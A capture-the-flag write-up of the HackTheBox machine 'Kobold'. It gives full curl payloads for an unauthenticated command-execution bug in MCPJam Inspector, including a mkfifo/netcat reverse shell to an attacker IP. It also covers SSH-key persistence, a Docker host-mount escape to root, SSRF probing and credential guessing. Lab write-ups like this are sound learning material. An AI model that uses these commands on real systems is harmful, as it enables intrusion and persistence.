# hackthebox: kobold writeup

**box:** kobold  

**os:** linux

**difficulty:** easy  

---

## tl;dr

1. **foothold:** unauthenticated rce in mcpjam inspector (cve-2026-23744) via `/api/mcp/connect` → shell as `ben`.
2. **privesc:** `ben` has implicit docker group access via pam. `newgrp docker` activates it. mount host `/` into a container with `--user 0` and read `/root/root.txt`.

the intended path is short. most of my time was spent down rabbit holes 😠

---

## recon

### port scan

```bash
nmap -sC -sV -oN nmap_initial.txt 10.129.1.96
```

```text
22/tcp  open  ssh       openssh 9.6p1 ubuntu
80/tcp  open  http      nginx 1.24.0 (ubuntu)  -> 301 to https://kobold.htb/
443/tcp open  ssl/http  nginx 1.24.0 (ubuntu)
        san: kobold.htb, *.kobold.htb
```

wildcard san hints at vhost routing.

### /etc/hosts

```bash
echo "10.129.1.96 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### vhost enum

```bash
gobuster vhost -u https://kobold.htb \
  -w /usr/share/seclists/discovery/dns/bitquark-subdomains-top100000.txt \
  --append-domain -k -t 50
```

two vhosts:

- `mcp.kobold.htb` → mcpjam inspector (node.js)
- `bin.kobold.htb` → privatebin 2.0.2

---

## foothold - mcpjam inspector rce (cve-2026-23744)

mcpjam inspector exposes an unauthenticated `/api/mcp/connect` endpoint that takes a `command` + `args` and passes them straight to `/bin/sh -c`. the endpoint advertises its required json shape via validation errors:

```bash
curl -sk -x post https://mcp.kobold.htb/api/mcp/connect \
  -h "content-type: application/json" \
  -d '{"command":"/bin/echo","args":["hello"]}'
# -> "serverconfig is required"
# ...add serverconfig wrapper, then.
# -> "serverid is required"
```

final payload shape:

```json
{
  "serverid": "pwn",
  "serverconfig": {
    "type": "stdio",
    "command": "/bin/sh",
    "args": ["-c", "<reverse shell>"]
  }
}
```

### reverse shell

listener on attacker:

```bash
nc -lvnp 4444
```

`bash -i >& /dev/tcp/...` failed — bash wasn't available in that exec context. the `mkfifo` payload worked:

```bash
curl -sk -x post https://mcp.kobold.htb/api/mcp/connect \
  -h "content-type: application/json" \
  -d '{"serverid":"pwn","serverconfig":{"type":"stdio","command":"/bin/sh","args":["-c","rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.182 4444 >/tmp/f"]}}'
```

lands as `ben@kobold` in `/usr/local/lib/node_modules/@mcpjam/inspector`. note that mcpjam runs as `ben` on the host, not in a container — this is the box's first head-fake.

### gotcha - local firewall

`nc -zv 10.10.14.182 4444` from a second terminal returned `connection refused`. the listener had exited because earlier probing closed it. restart with `nc -lvnp 4444` and verify with a fresh probe before firing the payload. (initially i misread this as a firewall issue.)

### stabilize + persistence

```bash
# in the shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
mkdir -p /home/ben/.ssh && chmod 700 /home/ben/.ssh
echo 'ssh-ed25519 aaaa... attacker' >> /home/ben/.ssh/authorized_keys
chmod 600 /home/ben/.ssh/authorized_keys
```

then from attacker box:

```bash
ssh -i ~/.ssh/htb_kobold ben@10.129.1.96
```

user flag at `/home/ben/user.txt`.

---

## privesc - newgrp docker

### the trick

`id ben` shows ben in groups `ben`, `operator` — **not** docker:

```text
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

but docker is running, the socket exists, and:

```bash
docker ps
# permission denied while trying to connect to the docker daemon socket
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 may 21 01:06 /var/run/docker.sock
```

the kicker: even tho `/etc/group` doesn't list ben in `docker`, **pam grants implicit docker group access at login**. you activate it with:

```bash
newgrp docker
```

after that:

```bash
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
docker ps
# container id   image                          ... names
# 4c40dd7bb727   privatebin/nginx-fpm-alpine:2.0.2  ... bin
```

### container escape to root

docker daemon runs as root, so anyone who can talk to the socket can mount host `/` into a container and read everything. standard escape.

two pitfalls we hit:

1. `docker run alpine ...` fails because the box has no outbound to `registry-1.docker.io`. use the **image that's already on disk**: `privatebin/nginx-fpm-alpine:2.0.2`.
2. the privatebin image's entrypoint launches s6/php-fpm and ignores `cmd` overrides. use `--entrypoint`.
3. the privatebin image drops to uid 82 (www-data) inside, so `cat /host/root/root.txt` still gets "permission denied" even with `/` mounted. force root with `--user 0`.

final command:

```bash
docker run --rm -it --user 0 --entrypoint /bin/sh \
  -v /:/host privatebin/nginx-fpm-alpine:2.0.2

# inside the container:
cat /host/root/root.txt
# or for a full host shell:
chroot /host /bin/bash
```

root flag captured.

---

## rabbit holes (the long way around)

kobold is designed to send you chasing cves that don't apply. we followed several before circling back.

### 1. cve-2026-23520 - arcane lifecycle-label rce

old writeups for "kobold" point at this. arcane is at `127.0.0.1:3552` (`*:3552` actually, reachable from attacker tool), and it has a known unauthenticated rce via docker lifecycle labels on the project create endpoint.

we confirmed via `/api/app-version` that arcane is v1.13.0 — the patched version. cve-2026-23520 was fixed in 1.13.0 by removing the lifecycle-label feature entirely. dead.

### 2. cve-2026-23944 - arcane unauth proxy bypass

same arcane, different bug: `/api/environments/{id}/...` proxies to remote agents *before* authenticating, when `id != local`. should work on 1.13.0, fixed in 1.13.2.

tested with an env-id sweep:

```bash
for id in $(seq 0 50); do
  resp=$(curl -s "http://127.0.0.1:3552/api/environments/$id/containers/json")
  case "$resp" in
    *unauthorized*) echo "$id: real env (auth required)";;
    *"not found"*) ;;
    *) echo "$id: $resp";;
  esac
done
```

only env `0` exists, and it's the local environment. cve-2026-23944 only fires for *remote* environments. no remote envs are configured. dead.

### 3. cve-2026-40242 — arcane unauth ssrf

`/api/templates/fetchUrl=...` is unauthenticated and the response body is json-parsed and reflected back as `{"data": <fetched json>}`. confirmed working:

```bash
curl -s "http://127.0.0.1:3552/api/templates/fetch?url=http://127.0.0.1:3552/api/version"
# returns the full /api/version json inside a "data" wrapper
```

what we tried:

- `file:///root/root.txt` → "unsupported protocol scheme" (blocked)
- `http://127.0.0.1:2375/`, `:2376/` → docker is unix-socket only
- `http://10.10.14.182:8080/` → context deadline exceeded; outbound to vpn is firewalled
- self-ssrf to arcane's own protected endpoints → still 401, headers correctly validated
- localhost port scanning → only found privatebin on 8080, mcpjam on 6274, and a mystery go server on 39915

port 39915 turned out to be a dead end — every path returned a go default `404: page not found`. likely arcane's internal ipc.

the ssrf was real, but with no `file://`, no outbound, and a docker daemon on a unix socket only, it couldn't reach anything sensitive.

### 4. privatebin filesystem-backend rce

ben is in group `operator` (gid 37), and `find / -group operator -writable` showed:

```text
/privatebin-data
/privatebin-data/certs/{cert,key}.pem
/privatebin-data/data
/privatebin-data/data/.htaccess
/privatebin-data/data/salt.php
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/bd/b5
```

this looks exploitable. privatebin stores pastes as `.php` files in `bd/<two>/<rest>.php`. we can write into `bd/b5/` and the top-level data dir. the hope: drop php, get included.

but:

- the `<?php # ...` in `salt.php` is a comment — privatebin reads the file with `file_get_contents`, not `include`.
- privatebin's nginx config explicitly denies serving anything from `/srv/data` (the container's view of `/privatebin-data/data`).
- the tls cert files are writable, but breaking nginx's tls doesn't help.

it looked like a privesc surface and turned out to be theater.

### 5. alice

`/etc/group` shows `operator:x:37:ben,alice` and `/home/alice` exists but is mode 750 to alice:alice. we never found a credential or pivot. alice was apparently a red herring too (or a setup for a different escalation path we didn't need).

### 6. brute-forcing arcane creds

`/api/auth/login` is unauthenticated. we tried `admin:admin`, `admin:kobold`, `alice:alice`, and the obvious neighbors. none worked. (not the path anyway.)

### 7. the encryption key in the systemd unit

```bash
cat /etc/systemd/system/arcane.service
# environment=encryption_key=q3bc9fpq/tp2uaxi9+gnec8ua1f71tf5izx5rske=
```

this is arcane's data encryption key. useful only if you can also read arcane's data file, which lives in `/root/` (root-only). without read access to `/root/*`, the key alone is useless. another setup that demands more access than we had.

---

## what i'd do differently next time

- **always run `newgrp <group>` early.** if a group is mentioned anywhere — `id`, `getent group`, pam logs — try activating it. it's free.
- **read the writeup pattern, not just cves.** when an "easy" box has three plausible cves against well-known software, suspect a misdirection.
- **don't anchor on the first plausible path.** i spent a lot of energy on operator-group writes against privatebin because the writability was so obvious. obvious is often the bait.
- **check `/etc/pam.d/` for unusual group additions.** implicit group access via pam is a sneaky pattern; it doesn't show up in `id` until activated.

---

## tools used

- `nmap`, `gobuster`, `curl`, `nc`
- `python3 -c 'import pty;pty.spawn(...)'` for shell upgrade
- `ssh` (key-based) for persistence
- `docker` (post-newgrp) for escape

## cves referenced

- **cve-2026-23744** - mcpjam inspector unauth rce (the one that worked)
- **cve-2026-23520** - arcane lifecycle-label rce (patched)
- **cve-2026-23944** - arcane unauth proxy bypass (needs remote env)
- **cve-2026-40242** - arcane unauth ssrf (no useful target)

## flags

- **user:** `/home/ben/user.txt` (readable as ben after foothold)
- **root:** `/root/root.txt` (readable inside the container as uid 0 with `/` mounted)
